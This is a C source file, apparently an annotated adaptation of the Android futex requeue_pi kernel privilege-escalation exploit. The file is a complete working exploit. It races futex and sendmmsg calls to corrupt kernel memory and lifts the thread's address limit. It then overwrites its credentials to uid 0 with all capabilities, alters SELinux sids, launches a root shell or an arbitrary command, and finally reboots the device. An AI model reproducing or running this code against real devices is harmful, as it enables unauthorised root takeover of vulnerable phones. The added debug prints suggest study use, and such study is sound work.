#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>
//179change added to check syscall error
#include <errno.h>
//179change added to use sleep syscall
#include <unistd.h>

#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

#define ARRAY_SIZE(a)		(sizeof (a) / sizeof (*(a)))

#define KERNEL_START		0xc0000000

#define LOCAL_PORT		5551

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
	unsigned long flags;
	int preempt_count;
	unsigned long addr_limit;
	struct task_struct *task;

	/* ... */
};

struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};

//179change changed mmsghdr to mmsghdr2
struct mmsghdr2 {
	struct msghdr msg_hdr;
	unsigned int  msg_len;
};

//bss
int uaddr1 = 0;
int uaddr2 = 0;
struct thread_info *HACKS_final_stack_base = NULL;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
volatile int do_socket_tid_read = 0;
volatile int did_socket_tid_read = 0;
volatile int do_splice_tid_read = 0;
volatile int did_splice_tid_read = 0;
volatile int do_dm_tid_read = 0;
volatile int did_dm_tid_read = 0;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int HACKS_fdm = 0;
unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
pthread_mutex_t *is_kernel_writing;
pid_t last_tid = 0;
int g_argc;
char rootcmd[256];


ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	len = write(pipefd[1], writebuf, count);

	if (len != count) {
		printf("FAILED READ @ %p : %d %d\n", writebuf, (int)len, errno);
		while (1) {
			sleep(10);
		}
	}

	read(pipefd[0], readbuf, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	write(pipefd[1], writebuf, count);
	len = read(pipefd[0], readbuf, count);

	if (len != count) {
		printf("FAILED WRITE @ %p : %d %d\n", readbuf, (int)len, errno);
		while (1) {
			sleep(10);
		}
	}

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

void write_kernel(int signum)
{
    //179change print 
    printf("wrie kernel fucntion\n");
	struct thread_info stackbuf;
	unsigned long taskbuf[0x100];
	struct cred *cred;
	struct cred credbuf;
	struct task_security_struct *security;
	struct task_security_struct securitybuf;
	pid_t pid;
	int i;
	int ret;
	FILE *fp;

	pthread_mutex_lock(&is_thread_awake_lock);
	pthread_cond_signal(&is_thread_awake);
	pthread_mutex_unlock(&is_thread_awake_lock);

	if (HACKS_final_stack_base == NULL) {
		static unsigned long new_addr_limit = 0xffffffff;
		char *slavename;
		int pipefd[2];
		char readbuf[0x100];

		printf("cpid1 resumed\n");

		pthread_mutex_lock(is_kernel_writing);

		HACKS_fdm = open("/dev/ptmx", O_RDWR);
		unlockpt(HACKS_fdm);
		slavename = ptsname(HACKS_fdm);

		open(slavename, O_RDWR);

		do_splice_tid_read = 1;
		while (1) {
			if (did_splice_tid_read != 0) {
				break;
			}
		}

		read(HACKS_fdm, readbuf, sizeof readbuf);

		printf("addr_limit: %p\n", &HACKS_final_stack_base->addr_limit);

		write_pipe(&HACKS_final_stack_base->addr_limit, &new_addr_limit, sizeof new_addr_limit);

		pthread_mutex_unlock(is_kernel_writing);

		while (1) {
			sleep(10);
		}
	}

	printf("cpid3 resumed.\n");

	pthread_mutex_lock(is_kernel_writing);

	printf("hack.\n");

	read_pipe(HACKS_final_stack_base, &stackbuf, sizeof stackbuf);
	read_pipe(stackbuf.task, taskbuf, sizeof taskbuf);

	cred = NULL;
	security = NULL;
	pid = 0;

	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		struct task_struct_partial *task = (void *)&taskbuf[i];


		if (task->cpu_timers[0].next == task->cpu_timers[0].prev && (unsigned long)task->cpu_timers[0].next > KERNEL_START
		 && task->cpu_timers[1].next == task->cpu_timers[1].prev && (unsigned long)task->cpu_timers[1].next > KERNEL_START
		 && task->cpu_timers[2].next == task->cpu_timers[2].prev && (unsigned long)task->cpu_timers[2].next > KERNEL_START
		 && task->real_cred == task->cred) {
			cred = task->cred;
			break;
		}
	}

	read_pipe(cred, &credbuf, sizeof credbuf);

	security = credbuf.security;

	if ((unsigned long)security > KERNEL_START && (unsigned long)security < 0xffff0000) {
		read_pipe(security, &securitybuf, sizeof securitybuf);

		if (securitybuf.osid != 0
		 && securitybuf.sid != 0
		 && securitybuf.exec_sid == 0
		 && securitybuf.create_sid == 0
		 && securitybuf.keycreate_sid == 0
		 && securitybuf.sockcreate_sid == 0) {
			securitybuf.osid = 1;
			securitybuf.sid = 1;

			printf("task_security_struct: %p\n", security);

			write_pipe(security, &securitybuf, sizeof securitybuf);
		}
	}

	credbuf.uid = 0;
	credbuf.gid = 0;
	credbuf.suid = 0;
	credbuf.sgid = 0;
	credbuf.euid = 0;
	credbuf.egid = 0;
	credbuf.fsuid = 0;
	credbuf.fsgid = 0;

	credbuf.cap_inheritable.cap[0] = 0xffffffff;
	credbuf.cap_inheritable.cap[1] = 0xffffffff;
	credbuf.cap_permitted.cap[0] = 0xffffffff;
	credbuf.cap_permitted.cap[1] = 0xffffffff;
	credbuf.cap_effective.cap[0] = 0xffffffff;
	credbuf.cap_effective.cap[1] = 0xffffffff;
	credbuf.cap_bset.cap[0] = 0xffffffff;
	credbuf.cap_bset.cap[1] = 0xffffffff;

	write_pipe(cred, &credbuf, sizeof credbuf);

	pid = syscall(__NR_gettid);
    //179change error check 
    if (pid < 0) {
       int errsv = errno;
       printf("__NR_gettid, %d, line, %d\n", errsv, __LINE__); 
    }
	for (i = 0; i < ARRAY_SIZE(taskbuf); i++) {
		static unsigned long write_value = 1;

		if (taskbuf[i] == pid) {
			write_pipe(((void *)stackbuf.task) + (i << 2), &write_value, sizeof write_value);

			if (getuid() != 0) {
				printf("ROOT FAILED\n");
				while (1) {
					sleep(10);
				}
			} else {	//rooted
				break;
			}
		}
	}

	sleep(1);

	if (g_argc >= 2) {
		system(rootcmd);
	} else {
		system("/system/bin/sh -i");
	}

	system("/system/bin/touch /dev/rooted");

	pid = fork();
	if (pid == 0) {
		while (1) {
			ret = access("/dev/rooted", F_OK);
			if (ret >= 0) {
				break;
			}
		}

		printf("wait 10 seconds...\n");
		sleep(10);

		printf("rebooting...\n");
		sleep(1);
		system("reboot");

		while (1) {
			sleep(10);
		}
	}

	pthread_mutex_lock(&done_lock);
	pthread_cond_signal(&done);
	pthread_mutex_unlock(&done_lock);

	while (1) {
		sleep(10);
	}

	return;
}

void *make_action(void *arg) {
	int prio;
	struct sigaction act;
	int ret;

	prio = (int)arg;
    //179chnage
    printf("make action, %d\n", prio);
	last_tid = syscall(__NR_gettid);
    //179change error check
    if (last_tid < 0) {
        int errsv = errno;
        printf("__NR_gettid, %d, line, %d\n", errsv, __LINE__);
    }

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_cond_signal(&is_thread_desched);
    
    //179change print
    printf("make action, write kernel pointer set\n");
	act.sa_handler = write_kernel;
	//179change
    //error type
    //act.sa_mask = 0;
    sigemptyset(&act.sa_mask);
    sigaddset(&act.sa_mask, 0);
	act.sa_flags = 0;
	act.sa_restorer = NULL;
	sigaction(12, &act, NULL);
    
    //179change print 
    printf("make action, set prio\n");
	setpriority(PRIO_PROCESS, 0, prio);

	pthread_mutex_unlock(&is_thread_desched_lock);

	do_dm_tid_read = 1;

	while (did_dm_tid_read == 0) {
		;
	}
    //179change print
    printf("make action, futex lock pi, %p\n", &uaddr2);
	ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    //179change error check
    if (ret < 0) {
        int errsv = errno;
        printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
    }
	printf("futex dm: %d\n", ret);

	while (1) {
		sleep(10);
	}

    //179change print
    printf("make action exit");
    return NULL;
}

pid_t wake_actionthread(int prio) {
    //179change print 
    printf("wake action, waking prio %d\n", prio);
	pthread_t th4;
	pid_t pid;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;

	do_dm_tid_read = 0;
	did_dm_tid_read = 0;

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_create(&th4, 0, make_action, (void *)prio);
	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

	pid = last_tid;

	sprintf(filename, "/proc/self/task/%d/status", pid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	}
	else {
		fread(filebuf, 1, sizeof filebuf, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	while (do_dm_tid_read == 0) {
		usleep(10);
	}

	did_dm_tid_read = 1;
    
    //179change printf 
    printf("wake action, waiting status context switch\n");
	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);

	}
    printf("wake action, exit waiting context switch\n");
	pthread_mutex_unlock(&is_thread_desched_lock);
    
    printf("wake action, woke prio %d\n", prio);
	return pid;
}

int make_socket() {
	int sockfd;
	struct sockaddr_in addr = {0};
	int ret;
	int sock_buf_size;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
	if (sockfd < 0) {
		printf("socket failed.\n");
		usleep(10);
	} else {
		addr.sin_family = AF_INET;
		addr.sin_port = htons(LOCAL_PORT);
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	}

	while (1) {
		ret = connect(sockfd, (struct sockaddr *)&addr, 16);
		if (ret >= 0) {
			break;
		}
		usleep(10);
	}

	sock_buf_size = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

	return sockfd;
}


void *send_magicmsg(void *arg) {
    //179change print 
    printf("starting send msg\n");
	int sockfd;
    //179change changed mmsghdr to mmsghdr2
	struct mmsghdr2 msgvec[1];
	struct iovec msg_iov[10];
    //179change
	//unsigned long databuf[0x20];
	unsigned long databuf[0x20];
	int i;
	int ret;

	waiter_thread_tid = syscall(__NR_gettid);
    //179change error check
    if (waiter_thread_tid < 0) {
        int errsv = errno;
        printf("__NR_gettid, %d, line, %d\n", errsv, __LINE__);
    }
	setpriority(PRIO_PROCESS, 0, 12);

	sockfd = make_socket();
    
    //179change
    //print for magic
    printf("Magic %ld\n", MAGIC);
	for (i = 0; i < ARRAY_SIZE(databuf); i++) {
		databuf[i] = MAGIC;
    }

	for (i = 0; i < 10; i++) {
        //write 12 to priority
        if (i == 8) {
            msg_iov[i].iov_base = (void *)MAGIC;
		    msg_iov[i].iov_len = 0x0b;
        }
        else if (i == 9) {
            msg_iov[i].iov_base = (void *)MAGIC;
		    msg_iov[i].iov_len = (void *)MAGIC;
        } else if (i == 6) {
            msg_iov[i].iov_base = 0x00;
		    msg_iov[i].iov_len = (void *)MAGIC;
        }
        //dont write to list_entry->prio or 
        else if (i != 6) {
		    msg_iov[i].iov_base = (void *)MAGIC;
		    msg_iov[i].iov_len = 0x10;
        }
    }

	msgvec[0].msg_hdr.msg_name = databuf;
	msgvec[0].msg_hdr.msg_namelen = sizeof databuf;
	msgvec[0].msg_hdr.msg_iov = msg_iov;
	msgvec[0].msg_hdr.msg_iovlen = ARRAY_SIZE(msg_iov);
	msgvec[0].msg_hdr.msg_control = databuf;
	msgvec[0].msg_hdr.msg_controllen = ARRAY_SIZE(databuf);
	msgvec[0].msg_hdr.msg_flags = 0;
	msgvec[0].msg_len = 0;

    //179 change set ret
	//syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
    //print statemet
    printf("send msg, futex wait requeue pi, %p, %p\n", &uaddr1, &uaddr2);
	ret = syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &uaddr2, 0);
	if (ret < 0) {
        int errsv = errno;
        printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
    }
    do_socket_tid_read = 1;

	while (1) {
		if (did_socket_tid_read != 0) {
			break;
		}
	}

	ret = 0;
    //179change pring
    printf("sending message\n");
	while (1) {
		ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
		if (ret <= 0) {
			break;
		}
	}

	if (ret < 0) {
		perror("SOCKSHIT");
	}
	printf("EXIT WTF\n");
	while (1) {
		sleep(10);
	}

	return NULL;
}

static inline setup_exploit(unsigned long mem)
{
	*((unsigned long *)(mem - 0x04)) = 0x81; //prio 9
	*((unsigned long *)(mem + 0x00)) = mem + 0x20; //prio.next
	*((unsigned long *)(mem + 0x08)) = mem + 0x28;  //node.next
	*((unsigned long *)(mem + 0x1c)) = 0x85; //prio 13
	*((unsigned long *)(mem + 0x24)) = mem; //prio.prev
	*((unsigned long *)(mem + 0x2c)) = mem + 8; //node.prev
}

void *search_goodnum(void *arg) {
	int ret;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;
	unsigned long magicval;
	pid_t pid;
	unsigned long goodval, goodval2;
	unsigned long addr, setaddr;
	int i;
	char buf[0x1000];
    
	//179change set ret error check
    //syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    //print
    printf("goodnum, futex lock pi, %p\n", &uaddr2);
    ret = syscall(__NR_futex, &uaddr2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
    if (ret < 0) {
        int errsv = errno;
        printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
    }
	while (1) {
        //179change print
        //error
        //error check
        printf("goodnum, futex cmp requeue pi, %p, %p\n", &uaddr1, &uaddr2);
		ret = syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1);
		if (ret == 1) {
			break;
		} else if (ret < 0) {
            int errsv = errno;
            printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
        }
		usleep(10);
	}

	wake_actionthread(6);
	wake_actionthread(7);
    //179change comment
    printf("search_goodnum, wake_action 6,7 done\n");

	uaddr2 = 0;
	do_socket_tid_read = 0;
	did_socket_tid_read = 0;
    
    //179change set ret error check
	//syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
    //print
    printf("goodnum futex requeue pi, %p\n", &uaddr2);
	ret = syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
	if (ret < 0) {
        int errsv = errno;
        printf("__NR_futex, %d, line, %d\n", errsv, __LINE__);
    }
    while (1) {
		if (do_socket_tid_read != 0) {
			break;
		}
	}

	sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	}
	else {
		fread(filebuf, 1, sizeof filebuf, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	did_socket_tid_read = 1;

	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);
	}

	printf("starting the dangerous things\n");
    fflush(stdout);

    
	setup_exploit(MAGIC_ALT);
	setup_exploit(MAGIC);

	magicval = *((unsigned long *)MAGIC);
   
    
     
    wake_actionthread(11);
    //179change
    printf("good numgood num woke thread 11");

	if (*((unsigned long *)MAGIC) == magicval) {
		printf("using MAGIC_ALT.\n");
		MAGIC = MAGIC_ALT;
	}

	while (1) {
		is_kernel_writing = (pthread_mutex_t *)malloc(4);
		pthread_mutex_init(is_kernel_writing, NULL);

		setup_exploit(MAGIC);

		pid = wake_actionthread(11);

		goodval = *((unsigned long *)MAGIC) & 0xffffe000;

		printf("%p is a good number\n", (void *)goodval);

		do_splice_tid_read = 0;
		did_splice_tid_read = 0;

		pthread_mutex_lock(&is_thread_awake_lock);

		kill(pid, 12);

		pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
		pthread_mutex_unlock(&is_thread_awake_lock);

		while (1) {
			if (do_splice_tid_read != 0) {
				break;
			}
			usleep(10);
		}

		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt = -1;
		}
		else {
			fread(filebuf, 1, sizeof filebuf, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt = atoi(pdest);
			fclose(fp);
		}

		did_splice_tid_read = 1;

		while (1) {
			sprintf(filename, "/proc/self/task/%d/status", pid);
			fp = fopen(filename, "rb");
			if (fp == 0) {
				vcscnt2 = -1;
			}
			else {
				fread(filebuf, 1, sizeof filebuf, fp);
				pdest = strstr(filebuf, "voluntary_ctxt_switches");
				pdest += 19;
				vcscnt2 = atoi(pdest);
				fclose(fp);
			}

			if (vcscnt2 != vcscnt + 1) {
				break;
			}
			usleep(10);
		}

		goodval2 = 0;

		setup_exploit(MAGIC);

		*((unsigned long *)(MAGIC + 0x24)) = goodval + 8;

		wake_actionthread(12);
		goodval2 = *((unsigned long *)(MAGIC + 0x24));

		printf("%p is also a good number.\n", (void *)goodval2);

		for (i = 0; i < 9; i++) {
			setup_exploit(MAGIC);

			pid = wake_actionthread(10);

			if (*((unsigned long *)MAGIC) < goodval2) {
				HACKS_final_stack_base = (struct thread_info *)(*((unsigned long *)MAGIC) & 0xffffe000);

				pthread_mutex_lock(&is_thread_awake_lock);

				kill(pid, 12);

				pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
				pthread_mutex_unlock(&is_thread_awake_lock);

				printf("GOING\n");

				write(HACKS_fdm, buf, sizeof buf);

				while (1) {
					sleep(10);
				}
			}

		}
	}

	return NULL;
}

void *accept_socket(void *arg) {
	int sockfd;
	int yes;
	struct sockaddr_in addr = {0};
	int ret;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

	yes = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(LOCAL_PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 1);

	while(1) {
		ret = accept(sockfd, NULL, NULL);
		if (ret < 0) {
			printf("**** SOCK_PROC failed ****\n");
			while(1) {
				sleep(10);
			}
		} else {
			printf("i have a client like hookers.\n");
		}
	}

	return NULL;
}

void init_exploit() {
	unsigned long addr;
	pthread_t th1, th2, th3;

	printf("running with pid %d\n", getpid());
    
    //179change print
    printf("accepting socket\n");
	pthread_create(&th1, NULL, accept_socket, NULL);

	addr = (unsigned long)mmap((void *)0x70000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    addr += 0x800;
	MAGIC = addr;
	//179change
    printf("Magic %ld\n", MAGIC);
    if ((long)addr >= 0) {
        int errsv;
        errsv = errno;
		printf("first mmap failed? %d\n", errno);
	}

	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC_ALT = addr;
    //179change
    printf("Magic alt %ld\n", MAGIC_ALT );
	if (addr > 0x110000) {
		printf("second mmap failed?\n");
		while (1) {
			sleep(10);
		}
	}
    //179change print
    printf("starting exploit\n");
	pthread_mutex_lock(&done_lock);
	pthread_create(&th2, NULL, search_goodnum, NULL);
	pthread_create(&th3, NULL, send_magicmsg, NULL);
	pthread_cond_wait(&done, &done_lock);
}

int main(int argc, char **argv) {
	g_argc = argc;

	if (argc >= 2) {
		snprintf(rootcmd, sizeof(rootcmd) - 1, "/system/bin/sh -c '%s'", argv[1]);
	}
    
    //179change print 
    printf("init_exploit() \n");

	init_exploit();

	printf("Finished, looping.\n");

	while (1) {
		sleep(10);
	}

	return 0;
}


